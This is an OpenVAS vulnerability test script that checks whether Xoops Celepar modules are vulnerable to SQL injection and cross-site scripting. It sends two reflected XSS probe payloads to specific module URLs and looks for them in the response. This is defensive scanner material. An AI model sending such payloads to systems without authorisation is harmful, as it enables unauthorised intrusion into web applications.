##############################################################################
# OpenVAS Vulnerability Test
#
# Xoops Celepar Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801153");
  script_version("2019-05-14T12:12:41+0000");
  script_tag(name:"last_modification", value:"2019-05-14 12:12:41 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(35820);
  script_cve_id("CVE-2009-4698", "CVE-2009-4713", "CVE-2009-4714");
  script_name("Xoops Celepar Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/35966");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9249");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9261");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/51985");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_xoops_celepar_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("xoops_celepar/detected");

  script_tag(name:"insight", value:"- The flaw exists in 'Qas (aka Quas) module'. Input passed to the 'codigo'
  parameter in modules/qas/aviso.php and modules/qas/imprimir.php, and the
  'cod_categoria' parameter in modules/qas/categoria.php is not properly
  sanitised before being used in an SQL query.

  - The flaw exists in 'Qas (aka Quas) module' and 'quiz'module. Input passed
  to the 'opcao' parameter to modules/qas/index.php, and via the URL to
  modules/qas/categoria.php, modules/qas/index.php, and
  modules/quiz/cadastro_usuario.php is not properly sanitised before being
  returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Xoops Celepar and is prone to multiple
  vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary SQL statements on the vulnerable system, which may allow an attacker
  to view, add, modify data, or delete information in the back-end database and
  also conduct cross-site scripting.");

  script_tag(name:"affected", value:"Xoops Celepar module 2.2.4 and prior");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");

xoopsPort = get_http_port(default:80);

celeparVer = get_kb_item("www/" + xoopsPort + "/XoopsCelepar");
if(!celeparVer)
  exit(0);

celeparVer = eregmatch(pattern:"^(.+) under (/.*)$", string:celeparVer);

sndReq = http_get(item:string(celeparVer[2], "/modules/qas/index.php"),
                  port:xoopsPort);
rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

if(rcvRes =~ "^HTTP/1\.[01] 200" && "_MI_QAS_POR"  >< rcvRes)
{

  url = string(celeparVer[2], "/modules/qas/categoria.php?cod_categoria='><script>alert('VT-XSS-Exploit');</script>");
  sndReq = http_get(item:url, port:xoopsPort);
  rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

  if(rcvRes =~ "^HTTP/1\.[01] 200" && "VT-XSS-Exploit" >< rcvRes) {
    report = report_vuln_url(port:xoopsPort, url:url);
    security_message(port:xoopsPort, data:report);
    exit(0);
  }
}

sndReq = http_get(item:string(celeparVer[2], "/modules/quiz/login.php"),
                  port:xoopsPort);
rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

if(rcvRes =~ "^HTTP/1\.[01] 200" && "Quiz:"  >< rcvRes)
{
  url = string(celeparVer[2], "/module/quiz/cadastro_usuario.php/>'><ScRiPt>alert('VT-XSS-Exploit');</ScRiPt>");
  sndReq = http_get(item:url, port:xoopsPort);
  rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

  if(rcvRes =~ "^HTTP/1\.[01] 200" && "VT-XSS-Exploit" >< rcvRes)
  {
    report = report_vuln_url(port:xoopsPort, url:url);
    security_message(port:xoopsPort, data:report);
    exit(0);
  }
}
